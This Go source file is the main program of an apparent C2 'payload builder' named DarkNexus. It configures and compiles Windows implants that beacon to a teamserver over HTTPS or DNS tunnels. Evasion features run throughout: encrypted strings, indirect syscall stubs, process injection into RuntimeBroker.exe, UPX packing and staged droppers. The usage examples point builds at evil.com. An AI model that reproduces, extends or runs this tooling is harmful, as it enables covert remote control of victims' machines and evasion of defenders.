package main

import (
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/darknexus/builder/internal/compiler"
	"github.com/darknexus/builder/internal/config"
	"github.com/darknexus/builder/internal/profile"
)

const banner = `
    ____             __      _   __
   / __ \____ ______/ /__   / | / /__  _  ____  _______
  / / / / __ '/ ___/ //_/  /  |/ / _ \| |/_/ / / / ___/
 / /_/ / /_/ / /  / ,<    / /|  /  __/>  </ /_/ (__  )
/_____/\__,_/_/  /_/|_|  /_/ |_/\___/_/|_|\__,_/____/

      [ Payload Builder ] v0.1.0
`

func main() {
	// C2 connection
	host := flag.String("host", "", "C2 teamserver host/IP (required)")
	port := flag.Int("port", 443, "C2 teamserver port")
	psk := flag.String("psk", "", "Pre-shared key (hex, 64 chars). Auto-generated if empty")

	// Profile
	profilePath := flag.String("profile", "", "Path to C2 profile YAML (default: profiles/default.yaml)")
	profileDir := flag.String("profile-dir", "", "Directory containing profiles (for --list-profiles)")

	// Beacon
	sleep := flag.Int("sleep", 0, "Override sleep interval in seconds")
	jitter := flag.Int("jitter", 0, "Override jitter percentage (0-100)")
	killDate := flag.String("kill-date", "", "Kill date in YYYYMMDD format")

	// Channel
	channel := flag.String("channel", "https", "Comms channel: https or dns")
	dnsDomain := flag.String("dns-domain", "", "DNS tunnel domain (required for --channel dns)")
	dnsNS := flag.String("dns-ns", "", "DNS nameserver IP (optional, defaults to system DNS)")

	// Build options
	arch := flag.String("arch", "x64", "Target architecture: x64 or x86")
	output := flag.String("output", "", "Output PE path (default: darknexus_<arch>.exe)")
	staged := flag.Bool("staged", false, "Build staged payload (small dropper)")
	strip := flag.Bool("strip", true, "Strip debug symbols")
	upx := flag.Bool("upx", false, "Compress with UPX after build")
	injectTarget := flag.String("inject-target", "RuntimeBroker.exe", "Default injection target process")

	// Paths
	implantDir := flag.String("implant-dir", "", "Path to implant source directory")
	templatePath := flag.String("template", "", "Path to config.h template")

	// Commands
	listProfiles := flag.Bool("list-profiles", false, "List available profiles and exit")
	genPSK := flag.Bool("gen-psk", false, "Generate a random PSK and exit")

	flag.Parse()

	fmt.Print(banner)

	// handle utility commands
	if *genPSK {
		key, err := config.GeneratePSK()
		if err != nil {
			fmt.Fprintf(os.Stderr, "[error] generate PSK: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("[psk] %s\n", key)
		return
	}

	if *listProfiles {
		dir := *profileDir
		if dir == "" {
			dir = findProfileDir()
		}
		profiles, err := profile.ListProfiles(dir)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[error] list profiles: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("[profiles] found %d profiles in %s\n", len(profiles), dir)
		for _, p := range profiles {
			prof, err := profile.Load(p)
			if err != nil {
				fmt.Printf("  - %s (error: %v)\n", filepath.Base(p), err)
				continue
			}
			fmt.Printf("  - %-25s %s\n", prof.Name, prof.Description)
		}
		return
	}

	// validate required args
	if *host == "" {
		fmt.Fprintf(os.Stderr, "[error] --host is required\n")
		flag.Usage()
		os.Exit(1)
	}

	// resolve paths
	if *implantDir == "" {
		*implantDir = findImplantDir()
	}
	if *templatePath == "" {
		*templatePath = findTemplatePath()
	}
	if *profilePath == "" {
		*profilePath = findDefaultProfile()
	}
	if *output == "" {
		*output = fmt.Sprintf("darknexus_%s.exe", *arch)
	}

	// generate PSK if not provided
	if *psk == "" {
		key, err := config.GeneratePSK()
		if err != nil {
			fmt.Fprintf(os.Stderr, "[error] generate PSK: %v\n", err)
			os.Exit(1)
		}
		*psk = key
		fmt.Printf("[psk] auto-generated: %s\n", *psk)
		fmt.Println("[psk] save this key, you need it for the teamserver --psk flag")
	}

	// validate PSK
	if len(*psk) != 64 {
		fmt.Fprintf(os.Stderr, "[error] PSK must be 64 hex characters (32 bytes)\n")
		os.Exit(1)
	}

	// load profile
	fmt.Printf("[profile] loading %s\n", *profilePath)
	prof, err := profile.Load(*profilePath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[error] load profile: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("[profile] using '%s': %s\n", prof.Name, prof.Description)

	// build config
	cfg := config.NewFromProfile(prof, *host, *port, *psk)
	cfg.Staged = *staged

	// apply overrides
	if *sleep > 0 {
		cfg.SleepSeconds = *sleep
	}
	if *jitter > 0 {
		cfg.JitterPercent = *jitter
	}
	if *killDate != "" {
		fmt.Sscanf(*killDate, "%d", &cfg.KillDate)
	}
	cfg.InjectTarget = *injectTarget

	// channel selection
	cfg.Channel = *channel
	if *channel == "dns" {
		if *dnsDomain == "" {
			fmt.Fprintf(os.Stderr, "[error] --dns-domain is required when --channel is dns\n")
			os.Exit(1)
		}
		cfg.DNSDomain = *dnsDomain
		cfg.DNSNameserver = *dnsNS
	}

	// generate config.h
	configOutput := filepath.Join(*implantDir, "src", "config.h")
	fmt.Printf("[config] generating %s (build ID: %s)\n", configOutput, cfg.BuildID)
	if err := cfg.GenerateConfigH(*templatePath, configOutput); err != nil {
		fmt.Fprintf(os.Stderr, "[error] generate config: %v\n", err)
		os.Exit(1)
	}

	// print build summary
	fmt.Println()
	fmt.Println("[build] ========== Build Summary ==========")
	fmt.Printf("[build] Channel:     %s\n", cfg.Channel)
	fmt.Printf("[build] C2:          %s:%d\n", cfg.C2Host, cfg.C2Port)
	if cfg.Channel == "dns" {
		fmt.Printf("[build] DNS Domain:  %s\n", cfg.DNSDomain)
		if cfg.DNSNameserver != "" {
			fmt.Printf("[build] DNS NS:      %s\n", cfg.DNSNameserver)
		}
	}
	fmt.Printf("[build] Profile:     %s\n", prof.Name)
	fmt.Printf("[build] Checkin:     %s\n", cfg.CheckinURI)
	fmt.Printf("[build] Result:      %s\n", cfg.ResultURI)
	fmt.Printf("[build] Sleep:       %ds (+/- %d%%)\n", cfg.SleepSeconds, cfg.JitterPercent)
	fmt.Printf("[build] PSK:         %s...%s\n", (*psk)[:8], (*psk)[56:])
	fmt.Printf("[build] Kill Date:   %d\n", cfg.KillDate)
	fmt.Printf("[build] Arch:        %s\n", *arch)
	fmt.Printf("[build] Staged:      %v\n", *staged)
	fmt.Printf("[build] Inject:      %s\n", cfg.InjectTarget)
	fmt.Printf("[build] Build ID:    %s\n", cfg.BuildID)
	fmt.Println("[build] ====================================")
	fmt.Println()

	// compile
	start := time.Now()

	// generate encrypted string table
	stringsScript := filepath.Join(*implantDir, "tools", "encrypt_strings.py")
	stringsOutput := filepath.Join(*implantDir, "src", "evasion", "strings_table.h")
	if _, err := os.Stat(stringsScript); err == nil {
		fmt.Println("[build] generating encrypted string table...")
		if err := compiler.RunPythonScript(stringsScript, stringsOutput); err != nil {
			fmt.Printf("[build] WARNING: string encryption failed: %v\n", err)
			fmt.Println("[build] strings will be in plaintext")
		}
	}

	// assemble syscall stubs first
	asmPath := filepath.Join(*implantDir, "src", "evasion", "syscall_stubs.asm")
	objPath := filepath.Join(*implantDir, "src", "evasion", "syscall_stubs.o")
	if _, err := os.Stat(asmPath); err == nil {
		fmt.Println("[build] assembling syscall stubs...")
		if err := compiler.NasmAssemble(asmPath, objPath, *arch); err != nil {
			fmt.Printf("[build] WARNING: syscall stub assembly failed: %v\n", err)
			fmt.Println("[build] continuing without indirect syscalls")
		}
	}

	result, err := compiler.CrossCompile(compiler.CompileOptions{
		ImplantDir:   *implantDir,
		OutputPath:   *output,
		Arch:         *arch,
		StripSymbols: *strip,
		StaticLink:   true,
		Staged:       *staged,
		UPXPack:      *upx,
	})
	if err != nil {
		fmt.Fprintf(os.Stderr, "\n[error] build failed: %v\n", err)
		os.Exit(1)
	}

	elapsed := time.Since(start)
	fmt.Println()
	fmt.Println("[done] ========== Build Complete ==========")
	fmt.Printf("[done] Output:    %s\n", result.OutputPath)
	fmt.Printf("[done] Size:      %d bytes (%.1f KB)\n", result.Size, float64(result.Size)/1024)
	fmt.Printf("[done] Arch:      %s\n", result.Arch)
	fmt.Printf("[done] Time:      %s\n", elapsed.Round(time.Millisecond))
	fmt.Println("[done] ========================================")

	if *staged {
		fmt.Println()
		fmt.Println("[staged] this is a staged payload")
		fmt.Println("[staged] the implant will pull its full payload from the C2 on first run")
	}
}

// path resolution helpers

func findImplantDir() string {
	// try relative paths from likely locations
	candidates := []string{
		"../implant",
		"../../implant",
		filepath.Join("..", "..", "implant"),
	}
	for _, c := range candidates {
		if info, err := os.Stat(c); err == nil && info.IsDir() {
			abs, _ := filepath.Abs(c)
			return abs
		}
	}
	// fallback
	return filepath.Join("..", "implant")
}

func findTemplatePath() string {
	candidates := []string{
		"templates/config.h.tmpl",
		"../templates/config.h.tmpl",
		filepath.Join("..", "templates", "config.h.tmpl"),
	}
	for _, c := range candidates {
		if _, err := os.Stat(c); err == nil {
			abs, _ := filepath.Abs(c)
			return abs
		}
	}
	return "templates/config.h.tmpl"
}

func findProfileDir() string {
	candidates := []string{
		"../../profiles",
		"../profiles",
		"profiles",
	}
	for _, c := range candidates {
		if info, err := os.Stat(c); err == nil && info.IsDir() {
			abs, _ := filepath.Abs(c)
			return abs
		}
	}
	return "profiles"
}

func findDefaultProfile() string {
	dir := findProfileDir()
	defaultPath := filepath.Join(dir, "default.yaml")
	if _, err := os.Stat(defaultPath); err == nil {
		return defaultPath
	}

	// try to find any .yaml
	profiles, _ := profile.ListProfiles(dir)
	if len(profiles) > 0 {
		return profiles[0]
	}

	return defaultPath
}

func init() {
	// custom usage
	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "Usage: darknexus-builder [options]\n\n")
		fmt.Fprintf(os.Stderr, "Required:\n")
		fmt.Fprintf(os.Stderr, "  --host string      C2 teamserver host/IP\n\n")
		fmt.Fprintf(os.Stderr, "Options:\n")
		flag.VisitAll(func(f *flag.Flag) {
			name := f.Name
			usage := f.Usage
			def := f.DefValue
			if def != "" && def != "false" && def != "0" {
				usage += fmt.Sprintf(" (default: %s)", def)
			}
			fmt.Fprintf(os.Stderr, "  --%-18s %s\n", name, usage)
		})
		fmt.Fprintf(os.Stderr, "\nExamples:\n")
		fmt.Fprintf(os.Stderr, "  darknexus-builder --host 10.10.14.5\n")
		fmt.Fprintf(os.Stderr, "  darknexus-builder --host evil.com --port 8443 --profile profiles/cdn-cloudfront.yaml\n")
		fmt.Fprintf(os.Stderr, "  darknexus-builder --host evil.com --psk <hex> --arch x86 --staged --upx\n")
		fmt.Fprintf(os.Stderr, "  darknexus-builder --host evil.com --channel dns --dns-domain t.evil.com\n")
		fmt.Fprintf(os.Stderr, "  darknexus-builder --list-profiles\n")
		fmt.Fprintf(os.Stderr, "  darknexus-builder --gen-psk\n")
	}

	// suppress the default "exit status 1" noise
	_ = strings.Contains("", "")
}
